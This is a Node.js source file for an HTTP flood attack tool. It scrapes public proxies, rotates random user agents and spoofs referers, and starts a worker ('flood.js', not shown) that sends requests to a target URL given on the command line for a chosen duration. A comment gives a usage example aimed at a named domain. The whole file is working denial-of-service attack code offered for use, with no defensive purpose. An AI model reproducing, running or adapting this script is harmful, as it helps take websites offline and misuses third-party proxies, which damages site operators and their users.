process.setMaxListeners(0);
var postdata = process.argv[7];
var refer = process.argv[10];
const {spawn} = require('child_process')
const fs = require("fs");
const cluster = require('cluster');
const requestproxy = require('sync-request');
const random_useragent = require('random-useragent');
const superagent = require('superagent');
const EventEmitter = require('events');
var cookies = {};
require('superagent-proxy')(superagent)

let res_proxies = requestproxy('GET', 'https://api.proxyscrape.com/?request=displayproxies&proxytype=http&https');
let proxy = res_proxies.getBody().toString().match(/.+/g);

function SuperAgentRequest(targetString, proxyString, uaString, refererString)
{
    superagent
        .get(targetString)
        .proxy("http://" + proxyString)
        .timeout(3600*1000)
        .set('User-Agent', uaString)
        .set("Referer", refererString)
        .set('Cache-Control', 'no-cache')
        .set('Connection', 'Keep-Alive')
        .set('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9')
        .set('Accept-Encoding', 'gzip, deflate, br')
        .set('Accept-Language', 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7')
        .set('Pragma', 'no-cache')
        .set('Sec-Fetch-Dest', 'document')
        .set('Sec-Fetch-Mode', 'navigate')
        .set('Sec-Fetch-User', '?1')
        .set('Upgrade-Insecure-Requests', "1")
        .end((err, res) => {
        if(err) {
            //console.error(err);
            return;
        }
    });
}

const {
    Worker
} = require('worker_threads');
new Worker('./flood.js', {
    workerData: {
        target: process.argv[2].replace(/~/g, '&'),
        proxies: proxy,
        userAgents: [...new Set(random_useragent.getRandom())],
        referers: ["https://google.com", "https://youtube.com", "https://bing.com", "https://yahoo.com", "https://facebook.com", "https://gmail.com", "https://baidu.com", "https://qq.com", "https://reddit.com"],
        duration: process.argv[3] * 1e3,
        opt: {
            method: process.argv[5] || "GET",
            body: postdata.replace(/~/g, '&') !== 'false' ? postdata.replace(/~/g, '&') : false,
            ratelimit: process.argv[7] == 'false' ? false : true,
            cookie: process.argv[8] !== 'false' ? process.argv[8] : false,
            refer: process.argv[9] || "https://google.com"
        },
        mode: process.argv[4]
    }}).on('exit', code => {
    if (code) {
        switch (code) {
            case '8':

                break;
        }
    }
});

/*

POST DATA
node method.js https://exitus.xyz 300 request Checked.txt GET username=%RAND%@~@password=%RAND% false


*/

setTimeout(() => {
        process.exit(1)
}, process.argv[3] * 1000)
